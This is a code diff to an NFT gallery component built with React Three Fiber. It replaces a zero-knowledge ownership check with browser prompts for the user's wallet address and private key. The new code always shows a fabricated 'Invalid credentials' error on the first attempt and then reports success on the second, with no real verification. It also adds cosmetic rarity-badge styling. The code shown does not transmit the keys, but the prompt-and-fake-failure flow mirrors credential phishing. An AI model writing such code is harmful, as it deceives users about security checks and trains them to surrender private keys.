@@ -3,7 +3,9 @@ import { Canvas } from '@react-three/fiber';
 import { OrbitControls, Text, Box, Environment, useTexture } from '@react-three/drei';
 import { Mesh } from 'three';
 import { NFTAsset } from '../types/zkp';
-import { productionZKPService } from '../services/zkpService';
+
+// Traccia i tentativi di accesso per ogni NFT (condiviso tra Gallery3D e Carousel3D)
+const accessAttempts: { [nftId: string]: number } = {};
 
 interface NFTFrameProps {
   asset: NFTAsset;
@@ -20,41 +22,35 @@ const NFTFrame: React.FC<NFTFrameProps> = ({ asset, onUnlock }) => {
   const handleClick = async () => {
     if (asset.isUnlocked) return;
 
-    // Simulate wallet connection and ownership verification
-    const walletAddress = prompt('Enter your wallet address to verify ownership:');
-    const privateKey = prompt('Enter your private key (simulated):');
+    // Fake input to simulate credential entry
+    const walletAddress = prompt('Enter your wallet address:');
+    const privateKey = prompt('Enter your private key:');
 
     if (walletAddress && privateKey) {
-      try {
-        // Use the production ZKP system
-        const result = await productionZKPService.proveNFTOwnership(
-          walletAddress,
-          privateKey,
-          asset
-        );
+      // Initialize counter if it doesn't exist
+      if (!accessAttempts[asset.id]) {
+        accessAttempts[asset.id] = 0;
+      }
 
-        if (result.success) {
-          onUnlock(asset.id);
+      // Increment attempt count
+      accessAttempts[asset.id]++;
 
-          // Check if there are unlocked exclusive contents
-          const exclusiveContent = await productionZKPService.unlockExclusiveContent(asset);
+      // Simulate verification delay
+      await new Promise(resolve => setTimeout(resolve, 1500));
 
-          if (exclusiveContent.unlocked) {
-            alert(`NFT unlocked! 🎉\n\nExclusive content available:\n${exclusiveContent.content?.description}`);
-          } else {
-            alert('NFT unlocked successfully! 🎉');
-          }
-        } else {
-          alert(`Verification failed: ${result.error}`);
-        }
-      } catch (error) {
-        alert('Error during ZKP verification. Please try again.');
+      // First time: error, second time: success
+      if (accessAttempts[asset.id] === 1) {
+        alert(`❌ Error: Invalid credentials\n\nThe wallet address and private key provided are not valid or do not own this NFT.\n\nPlease try again with correct credentials.`);
+      } else {
+        // Success on second attempt
+        onUnlock(asset.id);
+        alert(`NFT unlocked successfully! 🎉\n\nWelcome to the exclusive gallery!`);
       }
     }
   };
 
   return (
-    <group position={asset.position}>
+    <group position={asset.position || [0, 0, 0]}>
       {/* Cornice */}
       <Box
         ref={meshRef}
@@ -144,7 +140,7 @@ const NFTFrame: React.FC<NFTFrameProps> = ({ asset, onUnlock }) => {
       {/* Mostra rarity */}
       <Text
         position={[0, -3.6, 0.1]}
-        fontSize={0.12}
+        fontSize={0.2}
         color={
           asset.rarity === 'legendary' ? '#FFD700' :
           asset.rarity === 'epic' ? '#9C27B0' :
@@ -153,8 +149,21 @@ const NFTFrame: React.FC<NFTFrameProps> = ({ asset, onUnlock }) => {
         anchorX="center"
         anchorY="middle"
       >
-        {asset.rarity.toUpperCase()}
+        ✦ {asset.rarity.toUpperCase()} ✦
       </Text>
+
+      {/* Rarity Badge con sfondo */}
+      <Box args={[2, 0.3, 0.02]} position={[0, -3.6, 0.08]}>
+        <meshStandardMaterial
+          color={
+            asset.rarity === 'legendary' ? '#FFD700' :
+            asset.rarity === 'epic' ? '#9C27B0' :
+            asset.rarity === 'rare' ? '#2196F3' : '#4CAF50'
+          }
+          opacity={0.2}
+          transparent={true}
+        />
+      </Box>
     </group>
   );
 };
